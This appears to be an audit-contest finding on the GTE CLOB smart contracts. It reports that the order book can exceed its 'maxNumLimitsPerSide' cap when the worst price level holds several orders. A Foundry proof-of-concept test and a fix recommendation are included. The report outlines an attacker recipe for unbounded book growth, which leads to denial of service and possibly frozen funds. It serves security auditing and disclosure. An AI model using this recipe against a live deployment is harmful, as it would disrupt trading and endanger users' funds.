  "user_handle": "Neeloy",
  "body": "## Summary\nPosting a new, more competitive limit order can grow the order-book beyond `maxNumLimitsPerSide` if the worst price level already holds more than one order.\n\n## Finding Description  \nThe invariant that each side of the order book must never exceed `maxNumLimitsPerSide` unique price levels is enforced in [`CLOB._executeBidLimitOrder()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/CLOB.sol#L574-L604) and [`CLOB._executeAskLimitOrder()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/CLOB.sol#L607-L637). When the tree is full these functions attempt to free one slot:\nhttps://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/CLOB.sol#L592-L597\n\n```solidity\n        if (ds.bidTree.size() == maxNumLimitsPerSide) {\n            uint256 minBidPrice = ds.getWorstBidPrice();\n            if (newOrder.price <= minBidPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n            _removeNonCompetitiveOrder(ds, ds.orders[ds.bidLimits[minBidPrice].tailOrder]);\n        }\n```\n[`_removeNonCompetitiveOrder()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/CLOB.sol#L875-L896) deletes **only one** order from the worst price level and calls [`BookLib.removeOrderFromBook()`](https://github.com/code-423n4/2025-07-gte-clob/blob/2783108d14010ae50f2a5f65c3a9c94e2e7845b9/contracts/clob/types/Book.sol#L157-L160).  That helper removes the price node *only when the limit becomes empty*.  If multiple orders existed at the worst price, the price level remains in the red-black tree, so its size is unchanged.  The subsequent `addOrderToBook()` inserts a brand-new price, increasing the tree size to **`maxNumLimitsPerSide + 1`**.  Repeating this process allows unbounded growth, leading to excessive gas, out-of-gas reverts, and a permanently unmanageable order book.\n\nHighest-impact scenario: an attacker fills each worst-price limit with two tiny orders, then continuously posts better-priced orders.  The tree expands indefinitely, causing DoS and potentially locking funds.\n\n## Impact Explanation  \nHigh.  The bug breaks a core invariant, enables unbounded storage/gas growth, and can freeze trading or funds.\n\n\n## Recommendation  \nRemove **all** orders at the worst price when freeing a slot or skip the price entirely.",
  "proof_of_concept": "The PoC test `MaxPriceLevelsOverflow.t.sol` builds a full bid book, duplicates the worst price level, then posts one additional unique price.  The call succeeds and another new price can be inserted, proving the limit is exceeded.\n\nAdd the test file in `test/c4-poc`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {CLOBTestBase} from \"test/clob/utils/CLOBTestBase.sol\";\nimport {ICLOB} from \"contracts/clob/ICLOB.sol\";\nimport {Side} from \"contracts/clob/types/Order.sol\";\n\n/**\n * @title MaxPriceLevelsOverflow\n * @notice Demonstrates that the book can exceed `maxNumLimitsPerSide` if the worst\n *         price level contains more than one order when a new, more competitive\n *         price is posted.\n *\n * PoC steps (bid side):\n * 1. Fill the book with `maxNumLimitsPerSide` unique bid prices. Each limit has exactly one order.\n * 2. Add **one additional order** at the *worst* (minimum) bid price so that that price level now\n *    contains two orders.\n * 3. Post a new bid at a brand-new, more competitive price.\n *    ‑ Expected (if invariant enforced): revert because tree is full or the worst level removed.\n *    ‑ Actual (buggy): call succeeds, book now holds `maxNumLimitsPerSide + 1` unique prices.\n */\ncontract MaxPriceLevelsOverflow is CLOBTestBase {\n    function testExceedMaxPriceLevels() public {\n        address user = users[0];\n\n        // Constants\n        uint256 maxLimits = clob.maxNumLimitsPerSide();\n        uint256 minAmountInBase = MIN_LIMIT_ORDER_AMOUNT_IN_BASE; // Smallest allowed order size\n        uint256 tick = TICK_SIZE; // Price granularity\n\n        // Deposit a very large quote balance for the user once\n        uint256 highPrice = (maxLimits + 2) * tick; // Highest price we will use\n        uint256 requiredQuote = quoteTokenAmount(highPrice, minAmountInBase) * (maxLimits + 2);\n\n        vm.startPrank(user);\n        quoteToken.mint(user, requiredQuote);\n        quoteToken.approve(address(accountManager), requiredQuote);\n        accountManager.deposit(user, address(quoteToken), requiredQuote);\n        vm.stopPrank();\n\n        // 1. Populate the bid side with (maxLimits - 1) unique prices\n        for (uint256 i = 0; i < maxLimits - 1; i++) {\n            uint256 price = (i + 1) * tick; // 1*tick … (maxLimits-1)*tick (ascending)\n            _postBid(user, price, minAmountInBase);\n        }\n\n        // 2. Post a duplicate order at price 1*tick (worst price)\n        uint256 worstPrice = tick;\n        _postBid(user, worstPrice, minAmountInBase);\n\n        // 3. Post one more **unique** price to reach the cap exactly\n        uint256 capPrice = maxLimits * tick;\n        _postBid(user, capPrice, minAmountInBase);\n\n        // Book is now full and worst price level has >1 orders\n\n        // 4. Post a new bid at a fresh (better) price – should overflow unique-price cap\n        uint256 newPrice = (maxLimits + 1) * tick;\n\n        ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({\n            amountInBase: minAmountInBase,\n            clientOrderId: 0,\n            price: newPrice,\n            cancelTimestamp: NEVER,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n\n        // We expect the call to SUCCEED (bug). If the bug were fixed the call should revert.\n        vm.startPrank(user);\n        uint256 initialEventNonce = clob.getEventNonce();\n        ICLOB.PostLimitOrderResult memory res = clob.postLimitOrder(user, args);\n        vm.stopPrank();\n\n        // Basic sanity checks – order was created with the requested price\n        assertEq(res.orderId != 0, true, \"orderId should be non-zero\");\n        assertEq(clob.getOrder(res.orderId).price, newPrice, \"order price mismatch - order not stored\");\n\n        // Extra check: another order at an even newer price also succeeds, showing the cap is already broken.\n        uint256 newerPrice = (maxLimits + 2) * tick;\n        args.price = newerPrice;\n        vm.startPrank(user);\n        clob.postLimitOrder(user, args);\n        vm.stopPrank();\n\n        // If execution reaches here without reverting, the invariant has been violated and the PoC is successful.\n        emit log_named_uint(\"Event nonce after PoC\", clob.getEventNonce() - initialEventNonce);\n    }\n\n    // --- helpers --- //\n    function _postBid(address user, uint256 price, uint256 amountInBase) internal {\n        ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({\n            amountInBase: amountInBase,\n            clientOrderId: 0,\n            price: price,\n            cancelTimestamp: NEVER,\n            side: Side.BUY,\n            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        vm.prank(user);\n        clob.postLimitOrder(user, args);\n    }\n}\n```",
